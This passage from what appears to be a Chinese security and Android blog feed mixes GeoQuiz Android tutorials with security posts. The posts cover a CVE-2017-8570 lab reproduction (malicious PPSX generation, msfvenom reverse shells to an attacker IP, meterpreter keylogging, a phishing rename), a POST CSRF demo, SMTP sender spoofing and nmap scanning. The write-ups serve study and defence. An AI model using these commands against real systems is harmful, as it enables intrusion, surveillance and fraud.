View.OnClickListener() &#123; @Override public void onClick(View v) &#123; if (mAnswerIsTrue) &#123; mAnswerTextView.setText(R.string.true_button); &#125; else &#123; mAnswerTextView.setText(R.string.false_button); &#125; setAnswerShownResult(true); &#125; &#125;); &#125; 这里面的mAnswerTextView.setText(R.string.true_button);方法使用了TextView.setText(int)方法用来设置TextView要显示的文字，这里是通过资源ID来调试该方法的。 从 activity 获取返回结果现在的需求是当用用户偷看过答案后将用户是否偷看过答案的情况通知给QuizActivity。下面来解决这个问题。在QuizActivity.java中调用startActivityForResult()方法QuizActivity.java123456789101112private static final int REQUEST_CODE_CHEAT = 0; mCheatButton = (Button) findViewById(R.id.cheat_button); mCheatButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; boolean answerIsTrue = mQuestionBank[mCurrentIndex].isAnswerTrue(); Intent intent = CheatActivity.newIntent(QuizActivity.this, answerIsTrue); /*startActivity(intent);*/ startActivityForResult(intent, REQUEST_CODE_CHEAT); &#125; &#125;); mCheatButton这个按钮的监听器由startActivity(intent)变为了startActivityForResult(intent,REQUEST_CODE_CHEAT);现在为extra增加常量，再创建一个私有方法，用来创建intent，附加extra并设置结果值。然后在SHOW ANSWER按钮的监听器代码中调用该方法，设置结果值的方法如下:123456789101112131415161718private static final String EXTRA_ANSWER_SHOWN = "com.sqlsec.gg.geoquiz.answer_shown"; mShowAnswerButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; if (mAnswerIsTrue) &#123; mAnswerTextView.setText(R.string.true_button); &#125; else &#123; mAnswerTextView.setText(R.string.false_button); &#125; setAnswerShownResult(true); &#125; &#125;);private void setAnswerShownResult(boolean isAnswerShown) &#123; Intent data = new Intent(); data.putExtra(EXTRA_ANSWER_SHOWN, isAnswerShown); setResult(RESULT_OK, data);&#125; 新增一个成员变量保持CheatActivity回传的值，然后覆盖onActivityResult()方法获取它。QuizActivity.java1234567891011121314private boolean mIsCheater;@Overrideprotected void onActivityResult(int requestCode, int resultCode, Intent data) &#123; if (resultCode != Activity.RESULT_OK) &#123; return; &#125; if (requestCode == REQUEST_CODE_CHEAT) &#123; if (data == null) &#123; return; &#125; mIsCheater = CheatActivity.wasAnswerShown(data); &#125;&#125; 后期的调整toast 消息处理现在已经可以基于mIsCheater变量的值了，现在得改变之前toast的值信息:QuizActivity.java123456789101112131415161718192021222324252627int messageResId = 0; if (mIsCheater) &#123; messageResId = R.string.judgement_toast; &#125; else &#123; if (userPressTrue == answerIsTrue) &#123; messageResId = R.string.correct_toast; &#125; else &#123; messageResId = R.string.incorrect_toast; &#125; &#125; Toast.makeText(this,messageResId,Toast.LENGTH_SHORT).show(); ... mNextButton = (Button) findViewById(R.id.next_button); mNextButton.setOnClickListener(new View.OnClickListener()&#123; @Override public void onClick(View v)&#123; mCurrentIndex = (mCurrentIndex + 1) % mQuestionBank.length; /*int question = mQuestionBank[mCurrentIndex].getTextResId(); mQuestionTextView.setText(question);*/ mIsCheater = false; updateQuestion(); &#125; &#125;); activity 的管理ActivityManager维护着一个非特定应用独享的回退栈，所有的应用的activity都共享这个回退栈，包括安卓的启动器，这也就是为什么ActivityManager被设计成操作系统级的activity管理器来负责启动应用activity的原因之一。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>国光</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个简易的APP]]></title>
    <url>%2F2017%2F09%2Fandroid1.html</url>
    <content type="text"><![CDATA[记录了第一个简易app开发中遇到的知识点，以及一些自己对代码的理解 APP 预览首先这一次我们要做一个类似于问卷的app: 字符串资源 strings.xml每个项目都包含一个名为strings.xml的默认字符串文件。在项目的app/res/values目录下,strings.xml文件用户统一保存整个项目的字符串资源，然后方便我们查阅管理。 引用字符串资源strings.xml1234&lt;resources&gt; &lt;string name="app_name"&gt;GeoQuiz&lt;/string&gt; &lt;string name="true_button"&gt;TRUE&lt;/string&gt;&lt;/resources 在具体的布局界面中引用字符串资源123456&lt;LinearLayoutxmlns:android="http://schemas.android.com/apk/res/android"&gt;&lt;Button android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="@string/true_button" /&gt; &lt;/LinearLayout&gt; 这里这个布局中具体定义的Button这个组件通过android:text=&quot;@string/true_button&quot;就成功的调用了strings.xml文件中的TRUE,拿到了TRUE这个值。 设置事件监听器添加组件成员变量12import android.widget.Button; private Button mTrueButton; 引用组件1mTrueButton = (Button) findViewById(R.id.true_button); 这里先使用按钮的资源ID获取生成的对象，然后再进行Button类型的转换：(Button) findViewById(R.id.true_button) 设置监听器监听器通俗的来说就是用户单击这个按钮出发的响应事件，需要实现View.OnClickListener接口先实现一个空的监听器事件：1234567mTrueButton = (Button) findViewById(R.id.true_button); mTrueButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; //空的事件 这里暂时没有任何事件 &#125; &#125;); 传入setOnClickListener(OnClickListener)方法的参数是一个监听器。该参数是一个实现了OnClickListener接口的对象。 创建提示消息弹出我们称为toast的提示消息。Android的toast是用来通知用户的简短弹出消息，用户无需输入或进行任何操作。 strings.xml文件完善12&lt;string name="correct_toast"&gt;Correct!&lt;/string&gt;&lt;string name="incorrect_toast"&gt;Incorrect!&lt;/string&gt; 调用成makeText 创建提示消息这里面弹出的toast消息其实也就是完善了上面的按钮监听事件123456mTrueButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(QuizActivity.this,R.string.correct_toast,Toast.LENGTH_SHORT).show(); &#125;&#125;); 这里的话，当用户点击这个mTrueButton按钮就会触发.makeText(QuizActivity.this,R.string.correct_toast,Toast.LENGTH_SHORT).show()这里就会调用correct_toast弹出strings.xml里面对应的Correct!消息。 创建新的问题类到这里我们的APP只能进行单一的问题测试，当有很多个问题的时候，按照原来的方法去写就会很麻烦，效率也不高。所以这里我们创建一个Quesion.java类来单独的进行问题的整理。Question.java12345678public class Question &#123; private int mTextResId; private boolean mAnswerTrue; public Question(int textResId, boolean answerTrue) &#123; mTextResId = textResId; mAnswerTrue = answerTrue; &#125;&#125; 成员变量mTextResId的作用是:int类型显示问题的内容成员变量mAnswerTrue的作用是:boolean类型的，用来判断问题的对错 int 类型的疑问到这里小伙伴肯定有疑问了：成员变量mTextResId是int类型的，但是却用来显示问题的内容，说到内容这里我们第一时间肯定是想到了String类型.哈哈，我也有这个疑问，还好书的作者这里给了一个很详细的解释:12变量mTextResId用来保存地理知识问题字符串的资源ID。资源ID总是int类型，所以这里设置它为int而不是String类型 生成获取方法与设置方法123456789101112public int getTextResId() &#123; return mTextResId;&#125;public void setTextResId(int textResId) &#123; mTextResId = textResId;&#125; public boolean isAnswerTrue() &#123; return mAnswerTrue;&#125;public void setAnswerTrue(boolean answerTrue) &#123; mAnswerTrue = answerTrue;&#125; 新增按钮以及文本视图调整activity_quiz.xml1234567891011&lt;TextView android:id="@+id/question_text_view" android:layout_width="wrap_content" android:layout_height="wrap_content" android:padding="24dp" /&gt; &lt;Button android:id="@+id/next_button" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="@string/next_button" /&gt; strings.xml1&lt;string name="next_button"&gt;NEXT&lt;/string&gt; 这里删除了TextView的android:text属性定义。取消了硬编码地理知识问题。为TextView新增android:id属性。TextView组件需要资源ID。新增了Button按钮对应了strings.xml文件里面的NEXT的值。 完善 strings.xml 问题字符串12&lt;string name="question_xss"&gt;DOM XSS属于反射型XSS&lt;/string&gt;&lt;string name="question_sql"&gt;XSS 注入不属于HTTP头注入&lt;/string&gt; 增加问题对象数组QuizActivity.java12345678910public class QuizActivity extends AppCompatActivity &#123; private Button mTrueButton; private Button mFalseButton; private Button mNextButton; private TextView mQuestionTextView;private Question[] mQuestionBank = new Question[] &#123; new Question(R.string.question_xss, true), new Question(R.string.question_sql, false), &#125;; private int mCurrentIndex = 0; 通过多次调用Question类的构造方法，创建了Question对象数组 TextView 显示问题内容1234 mQuestionTextView = (TextView) findViewById(R.id.question_text_view); int question = mQuestionBank[mCurrentIndex].getTextResId(); mQuestionTextView.setText(question);&#125; 这里首先去R.id.question_text_view找到text_view的值，然后转换为TextView类型，用int类型的question去拿到当前问题数组中的值，然后用setText(question)拿到textview的值，赋值给mQuestionTextView。 为 next 按钮设置监听事件123456789mNextButton = (Button) findViewById(R.id.next_button);mNextButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; mCurrentIndex = (mCurrentIndex + 1) % mQuestionBank.length; int question = mQuestionBank[mCurrentIndex].getTextResId(); mQuestionTextView.setText(question); &#125;&#125;); 这里的主要的事件类型是mCurrentIndex = (mCurrentIndex + 1) % mQuestionBank.length; 这样的话就拿到了核心代码就是mCurrentIndex + 1，这里实现了问题数组往下一个切换。 封装 updateQuestion() 封公共代码为什么要封装代码，因为我们一开始定义mQuestionTextView的时候就使用了如下的代码:123mQuestionTextView = (TextView) findViewById(R.id.question_text_view);int question = mQuestionBank[mCurrentIndex].getTextResId();mQuestionTextView.setText(question); 当我们 为 next 按钮触发监听事件的时候也写到了如下的代码:12345public void onClick(View v) &#123; mCurrentIndex = (mCurrentIndex + 1) % mQuestionBank.length; int question = mQuestionBank[mCurrentIndex].getTextResId(); mQuestionTextView.setText(question); &#125; 这里就出现了重复的去写一段代码了，这显然不是一个合格的程序员所做的事情，所以这里得想办法把这块重复代码进行封装一下：定义一个updateQuestion()方法:1234private void updateQuestion() &#123; int question = mQuestionBank[mCurrentIndex].getTextResId(); mQuestionTextView.setText(question); &#125; 然后可以直接使用updateQuestion();来简化上面的操作。 对答案进行判断增加方法checkAnswer(boolean)，用于判断答案的正确与否：123456789101112131415private void updateQuestion() &#123; int question = mQuestionBank[mCurrentIndex].getTextResId(); mQuestionTextView.setText(question);&#125;private void checkAnswer(boolean userPressedTrue) &#123; boolean answerIsTrue = mQuestionBank[mCurrentIndex].isAnswerTrue(); int messageResId = 0; if (userPressedTrue == answerIsTrue) &#123; messageResId = R.string.correct_toast; &#125; else &#123; messageResId = R.string.incorrect_toast; &#125; Toast.makeText(this, messageResId, Toast.LENGTH_SHORT).show(); &#125; 进行答案正确的基本的逻辑判断，当答案正确的时候，直接使用toast来弹出R.string.correct_toast的值；答案错误的时候，使用toast来弹出R.string.incorrect_toas的值。 为按钮设置 cheakAnswer 事件12345678910mTrueButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; checkAnswer(true);&#125; mFalseButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; checkAnswer(false);&#125; 第2章挑战练习为 TextView 添加监听器NEXT按钮不错，但如果用户单击应用的TextView文字区域（地理知识问题），也可以跳转到下一道题，用户体验应该会更好。你来试一试。这里面思路就是为mQuestionTextView对象也设置一个监听事件，然后功能上的代码和next按钮几乎是一样的。12345678mQuestionTextView.setOnClickListener(new View.OnClickListener()&#123; @Override public void onClick(View v)&#123; mCurrentIndex = (mCurrentIndex + 1) % mQuestionBank.length; mIsCheater = false; updateQuestion(); &#125; &#125;); 添加后退按钮为GeoQuiz应用新增后退按钮，用户单击时，可以显示上一道测试题目。这里首先布局文件xml文件添加个 与 next按钮一样的 Button组件即可，这里不再叙述，下面写出 关键功能是 java代码，其实关键点就在于mCurrentIndex = (mCurrentIndex - 1) % mQuestionBank.length;12345678mPrevButton = (Button) findViewById(R.id.prev_button); mPrevButton.setOnClickListener(new View.OnClickListener()&#123; @Override public void onClick(View v)&#123; mCurrentIndex = (mCurrentIndex - 1) % mQuestionBank.length; updateQuestion(); &#125; &#125;); 为按钮添加图标12345&lt;Button android:id="@+id/next_button" android:drawableRight="@drawable/arrow_right" android:drawablePadding="4dp" /&gt; 这里drawableRight就是将 图标添加到 按钮的 左边部分，反之要添加到 右面部分 只需要 改为：drawableLeft,这样图标就添加到左边了。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>国光</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android 开发初体验]]></title>
    <url>%2F2017%2F09%2Fandroid2.html</url>
    <content type="text"><![CDATA[解释了一些anroid开发中的一些基本的术语 算是一篇扫盲文章吧 Android Studio 的优势 界面美观 速度优于Eclipse 提示补全更加人性化 整合了Gradle构建工具 支持Google Cloud Platform 强大的UI编辑器 GenyMoton 虚拟机受欢迎的第三方模拟器，依赖于VirtualBox，严格来说genymotion是虚拟机，加载app的速度比较快，操作起来也很流畅，最近随着android studio自带模拟器的优化，genyMoton使用的就没有以前那么广泛。 DDMSDalvik Debug Monitor Service，提供了一系列的调试服务现在是空的，现在打开模拟器看下日志记录的效果: MVC Android 的设计模式程序的目录结构 mainfests 目录这个目录中的AndroidMainifest.xml文件是项目系统配置文件，或者称为清单文件 java目录 res目录 Gradle Scripts Android 应用程序结构解析资源描述文件 values目录中的文件colors.xml 该文件用于定义颜色常亮dimens.xml用于定义布局常量，常用的尺寸单位为dip和sp，绝大多数 sp用字体string.xml 定义和存储项目中的字符串资源，而且可以用来适配多种语言，方便实现国际化 界面布局文件 res目录中的文件在资源中对另一种资源引用的时候，一般引用的格式为@type/name，资源引用还有另一种格式为@+type/name R.java 文件所有的资源在这个文件中都有一个唯一的ID标识，而且必须在文件中注册，该文件自动生成，自动维护，出一些奇怪的错误的时候可以考虑 如下操作：完整的代码结构如下: AndroidManifest.xml 应用程序包名称 应用程序申请的自身所需要的权限 应用程序中包含的组件123456789101112131415161718192021&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.sqlsec.gg.geoquiz"&gt; &lt;application android:allowBackup="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/AppTheme"&gt; &lt;activity android:name=".QuizActivity"&gt; &lt;intent-filter&gt; &lt;action android:name="android.intent.action.MAIN" /&gt; &lt;category android:name="android.intent.category.LAUNCHER" /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; 这里面可以添加多个activity，是程序的一个启动入口。 Android 的基本组件 活动:Activity 应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 服务: Service 一个Service 是一段长生命周期的，没有用户界面的程序，可以用来开发如监控类程序。 广播接收器: BroadcasrReceiver 不执行任何任务，广播是一种广泛运用的在应用程序之间传输信息的机制。而 BroadcastReceiver 是对发送出来的广播进行过滤接收并响应的一类组件。 内容提供者 内容提供者，作为应用程序之间唯一的共享数据的途径，Content Provider 主要的功能就是存储并检索数据以及向其他应用程序提供访问数据的接口。 Android Studio优化安装字体下载地址http://ombgvjpli.bkt.clouddn.com/MONACO.TTF安装字体双击打开字体文件 然后点击左上角的安装 ，这一个操作其实就是系统把这个字体文件拷贝到系统的字体目录下。 安装主题这里使用的是经典的Sublime Text3下的monkai主题下载地址http://ombgvjpli.bkt.clouddn.com/SublimeMonoKai.jar导入主题File-Import Settings 然后选择 刚刚下载的主题的jar包 即完成了主题的安装 配置主题菜单栏依次点击 File - Settings - Editor - Colors &amp; Fonts - Font ，然后就可以对主题和字体进行一些相关的设置，使用第三方字体的话 得 取消勾选Show only monospaced fonts Ctrl + 鼠标滚轮快速调整字体大小设置里面勾选 ，然后就可以愉快的使用 鼠标滚轮 + Ctrl 快速调整字体大小了]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Office CVE-2017-8570远程代码执行漏洞复现]]></title>
    <url>%2F2017%2F08%2Fofficecve.html</url>
    <content type="text"><![CDATA[简单的漏洞复现，主要是科普metasploit，以后会更新metasploit深入的文章～ 漏洞简介编号CVE-2017-8570 影响版本12345678Microsoft Office 2007 Service Pack 3Microsoft Office 2010 Service Pack 2 (32-bit editions)Microsoft Office 2010 Service Pack 2 (64-bit editions)Microsoft Office 2013 RT Service Pack 1Microsoft Office 2013 Service Pack 1 (32-bit editions)Microsoft Office 2013 Service Pack 1 (64-bit editions)Microsoft Office 2016 (32-bit edition)Microsoft Office 2016 (64-bit edition) 危害2017年7月，微软在例行的月度补丁中修复了多个Microsoft Office漏洞，其中的CVE-2017-8570漏洞为一个逻辑漏洞，利用方法简单。网上已经出现该漏洞的利用代码，影响范围较广。 该漏洞为Microsoft Office的一个远程代码执行漏洞。其成因是Microsoft PowerPoint执行时会初始化Script”Moniker对象，而在PowerPoint播放动画期间会激活该对象，从而执行sct脚本（Windows Script Component）文件。攻击者可以欺骗用户运行含有该漏洞的PPT文件，导致获取和当前登录用户相同的代码执行权限。 复现环境受害者（靶机）操作系统: windows 7 sp1 x86Office版本Office 专业增强版 2016ip10.0.0.116 攻击者操作系统Deepin 15.4.1metasploit版本v4.14.28-devip10.0.0.103 exp原作者的github链接挂了，暂时就放在了我的github里面:https://github.com/tezukanice/Office8570.git 参考视频https://www.youtube.com/watch?v=zpfNf8JTSQM 生成恶意文件生成恶意PPSX文件1python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://10.0.0.103/logo.doc 这里的10.0.0.103是攻击者的ip地址 生成反弹shell 的 exe 文件1msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.103 LPORT=6666 -f exe &gt; shell.exe LHOST是攻击者的ip，LPORT这里设置的是监听本机的6666端口这里注意 当攻击目标为64位的操作系统的时候，生成的exe得改为:1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.103 LPORT=6666 -f exe &gt; shell.exe 监听会话监听来自 ppsx 执行反弹 shel1python cve-2017-8570_toolkit.py -M exp -e http://10.0.0.103/shell.exe -l shell.exe 一开始我这边由于没有切换到root用户导致 权限被拒绝,su切换到root用户解决问题。 msf 的监听1234567891011~ msfconsolemsf &gt; use exploit/multi/handlermsf &gt; set LHOST 10.0.0.103msf &gt; set LPORT 6666msf &gt; set PAYLOAD windows/meterpreter/reverse_tcpmsf &gt; exploit 同样，这里攻击64位操作系统的时候，得做出如下的调整:1msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp 钓鱼攻击将生成的恶意 Invoice.ppsx 文件重命名为:2017showgirl联系方式.ppsx 复制到目标靶机 windows7系统。然后目标一不小心点开了这个ppt文件的时候:即可在 MSF 反弹 metertprter 的 shell 出来： 后续渗透截图12meterpreter &gt; screenshotScreenshot saved to: /home/ctf/ccoDxgvg.jpeg 正在看b站小姐姐视频～～ 键盘记录12345678910111213meterpreter &gt; keyscan_start # 开启键盘记录Starting the keystroke sniffer...meterpreter &gt; keyscan_dump #查看键盘记录内容Dumping captured keystrokes...**-[ C:\soft\SogouExplorer\SogouExplorer.exe-[ @ 2017年8月13日 4:07:31 UTC**&lt;Shift&gt;xiaojiejie &lt;Shift&gt;chain&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;inajoy&lt;CR&gt;meterpreter &gt; keyscan_stop #关闭键盘记录 可以看到win7的主人在搜狗浏览器中输入了如下内容:xiao jie jie chinajoy这里面的&lt;^H&gt; 是删除键 &lt;CR&gt;是 回车键 上传文件1meterpreter &gt; upload /home/ctf/Desktop/快别看小姐姐了你被黑啦.txt C:\\users\\gg\\Desktop 把我们的友情提示上传到win7系统主人的 电脑桌面上12345678ctf@guoguang:~/Desktop$ cat 快别看小姐姐了你被黑啦.txt 整天不是逛B站 就是 逛A站除了看小姐姐 还是看小姐姐！～～(严肃脸)我只想对你说 4个字:请带上我meterpreter &gt; upload /home/ctf/Desktop/快别看小姐姐了你被黑啦.txt C:\\users\\gg\\Desktop[*] uploading : home/ctf/Desktop/快别看小姐姐了你被黑啦.txt -&gt; C:\users\gg\Desktop[*] uploaded : home/ctf/Desktop/快别看小姐姐了你被黑啦.txt -&gt; C:\users\gg\Desktop\快别看小姐姐了你被黑啦.txt shell1meterpreter &gt; shell shell 顾名思义就是shell了，这个命令相当于完全控制了windows的cmd命令行，可以执行任意cmd操作，当然只要权限足够大的话。 漏洞修复 及时安装微软2017年7月发布的最新补丁 经得住诱惑，不打开来历不明的office文件如果没有打补丁的话，其实还有一直比较稳妥的打开PPT的方法，就是 不用 双击 打开PPT，打开PPT直接拖动打开 是不会触发运行exe程序的:如下图:]]></content>
      <categories>
        <category>黑客</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>漏洞</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[POST型CSRF简单复现]]></title>
    <url>%2F2017%2F08%2Fpostcsrf.html</url>
    <content type="text"><![CDATA[最简单的POST型CSRF，只做入门参考文章，日后会进一步更新相关深入的文章。 POST型CSRF简介这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单。访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。 抓包生成CSRF POC用管理员账号登录一个存在CSRF漏洞的管理系统,来进行信息添加。然后用BurpSuite抓取提交的数据包。右键 使用BurpSuite自带的生成工具生成CSRF POC这个时候把刚刚管理员正常操作的数据包Forward发出去。在 CSRF PoC生成器的窗口中我们可以修改这个表达里的内容，然后来测试CSRF是否存在。可以直接在浏览器中测试，也可以保存表单在本地的HTML文件中来测试。 修改表单内容我们这里使用保存到本地的HTML文件来测试CSRF。修改表单中content内容的值为:This is CSRF Test by hacker现在如果管理员打开了这个表单，并且提交数据的话，如果存在CSRF漏洞，那么我们修改后的表单内容应该是可以正常提交的。 管理员触发表单为了模拟管理员触发这个表单，我们用已经登录这个校园管理系统的浏览器来打开这个HTML表单。点击提交请求。可以看到修改后的表单内容也被提交了。至此，一个简单入门级别的CSRF漏洞就触发成功了。]]></content>
      <categories>
        <category>黑客</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SMTP协议25端口渗透测试记录]]></title>
    <url>%2F2017%2F08%2Fsmtp.html</url>
    <content type="text"><![CDATA[记录了最底层的邮件伪造漏洞的复现。 简介SMTP 为邮件协讫，默认端口 25。经常用来邮箱伪造，钓鱼攻击。迓有流行癿 SMTP 账号信息泄露。如 github，oschina 上癿源码托管中癿信息泄露。 建立TCP连接知道了邮件服务器的地址，就可以与它建立 TCP 连接了。SMTP 协议的默认端口是25。使用 Telnet 或 Netcat 命令，都可以连接该端口。123$ telnet xxxx.com 25 #widnows下测试# 或者$ nc xxxxx.com 25 #Linux下测试 服务器返回220状态码，就表示连接成功。1220 MAIL-SERVER Winmail Mail Server ESMTP ready 接下来，就可以使用 SMTP 协议的各种命令与邮件服务器交互了。 HELO 命令和 EHLO 命令SMTP 协议规定，连接成功后，必须向邮件服务器提供连接的域名，也就是邮件将从哪台服务器发来。1HELO xxxx.com 邮件服务器返回状态码250，表示响应成功。1250 MAIL-SERVER Winmail Mail Server HELO命令现在比较少用，一般都使用EHLO命令。邮件服务器收到EHLO命令以后，不仅会返回250状态码，还会返回自己支持的各种扩展的列表。1234250-MAIL-SERVER Winmail Mail Server250-AUTH LOGIN PLAIN250-SIZE 20971520250 8BITMIME MAIL FROM 命令连接者要使用MAIL FROM命令，向邮件服务器提供邮件的来源邮箱1MAIL FROM:admin@xxxx.com #伪造管理员身份来发邮件 上面代码表示，连接者将从admin@xxxxx.com向邮件服务器发送邮件。邮件服务器返回250状态码，表示响应成功。1250 ok RCPT TO 命令使用RCPT TO命令，验证邮件地址是否存在。如果查询的是一个真实的 Email 地址，邮件服务器就会返回250状态码。验证邮箱存在的话，还可以给这个接受者邮箱发送邮件。12RCPT TO:admin@xxxxx.com250 ok 一般来说，状态码 250 和 251 都表示邮箱存在，状态码 5xx 表示不存在，神马影院其他状态码（主要是 4xx）则代表无法确认。 DATA 伪造邮箱数据使用DATA命令来伪造邮箱内容,客户端告诉服务器自己准备发送邮件正文服务器返回354，表示自己已经作好接受邮件的准备12DATA354 go ahead, end data with CRLF.CRLF 输入邮件伪造正文用英文状态的双引号来修饰正文，正文结束后，发送结束符.表明正文的结束。123&quot;这是一个邮件伪造测试&quot;.250 ok message accepted for delivery 如果合理，服务端返回250表示成功 退出TCP连接邮件发送结束，客户端请求断开连接后，使用QUIT命令关闭 TCP 连接。服务器返回211，提示断开申请被采纳，并主动断开连接，整个邮件发送过程结束。123QUIT221 MAIL-SERVER Winmail Mail ServerConnection closed by foreign host. 完整的流程图]]></content>
      <categories>
        <category>黑客</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>端口渗透</tag>
        <tag>SMTP</tag>
        <tag>邮件伪造</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nmap不老的神器]]></title>
    <url>%2F2017%2F07%2Fnmap.html</url>
    <content type="text"><![CDATA[总结了nmap的基本用法和脚本的使用，充分利用脚本在信息收集的时候有时候可以起到意想不到的效果~ 介绍nmap是用来探测计算机网络上的主机和服务的一种安全扫描器。为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。 特点 主机探测 端口扫描 版本检测 支持探测脚本的编写安装官网:http://nmap.org图形化:Zenmap 基本操作基本快速扫描Nmap 默认发送一个arp的ping数据包，来探测目标主机在1-10000范围内所开放的端口。1nmap 10.130.1.43 快速扫描多个目标12nmap &lt;target ip1 address&gt; &lt;target ip2 address&gt;nmap 10.130.1.28 10.130.1.43 详细描述输出扫描简单扫描，并对返回的结果详细描述输出,这个扫描是可以看到扫描的过程的,漫长的扫描的过程中可以看到百分比， 就不会显得那么枯燥，而且可以提升逼格。1nmap -vv 10.1.1.254 亲测,-v和-vv扫描几乎是一样都，都是列出了详细的扫描过程。 指定端口和范围扫描nmap 默认扫描目标1-10000范围内的端口号。我们则可以通过参数-p 来设置我们将要扫描的端口号12nmap -p(range) &lt;target IP&gt; namp -p3389,20-100 10.130.1.43 扫描除过某一个ip外的所有子网主机1nmap 10.130.1.1/24 -exclude 10.130.1.1 扫描除过某一个文件中的ip外的子网主机1nmap 10.130.1.1/24 -excludefile gov.txt 显示扫描的所有主机的列表1nmap -sL 10.130.1.1/24 sP ping 扫描nmap 可以利用类似window/linux 系统下的ping方式进行扫描1nmap -sP &lt;target ip&gt; 一般来说 我们会用这个命令去扫描内网的一个ip范围，用来做内网的主机发现。1nmap -sP 10.130.1.1-255 PING扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用. sS SYN半开放扫描1nmap -sS 192.168.1.1 Tcp SYN Scan (sS) 这是一个基本的扫描方式,它被称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root/administrator权限。 sT TCP扫描1nmap -sT 192.168.1.1 不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口。 sU UDP扫描1nmap -sU 192.168.1.1 这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的. sF FIN标志的数据包扫描1nmap -sF 110.130.1.43 可以看出这个扫描的话 会漏扫许多~FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包. sV Version版本检测扫描1nmap -sV 192.168.1.135 本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCPSYN扫描开放了哪些端口。这个扫描的话，速度会慢一些，67.86秒扫一个IP。 O OS操作系统类型的探测1nmap -O 10.130.1.43 远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。 osscan-guess 猜测匹配操作系统1nmap -O --osscan-guess 192.168.1.134 通过Nmap准确的检测到远程操作系统是比较困难的，需要使用到Nmap的猜测功能选项,–osscan-guess猜测认为最接近目标的匹配操作系统类型。 PN No ping扫描1nmap -O -PN 192.168.1.1/24 如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现 。这个扫描整个c段局域网的话还是比较耗时的，但是信息收集很详细，大概耗时9分钟。 T 设置时间模板1nmap -sS -T&lt;0-5&gt; 192.168.1.134 优化时间控制选项的功能很强大也很有效，但有些用户会被迷惑。此外， 往往选择合适参数的时间超过了所需优化的扫描时间。因此，Nmap提供了一些简单的 方法，使用6个时间模板，使用时采用-T选项及数字(0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5) paranoid、sneaky模式用于IDS躲避 Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。 Normal为默认模式，因此-T3 实际上是未做任何优化。 Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描. nsane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。 网段扫描格式1nmap -sP &lt;network address &gt; &lt;/CIDR &gt; 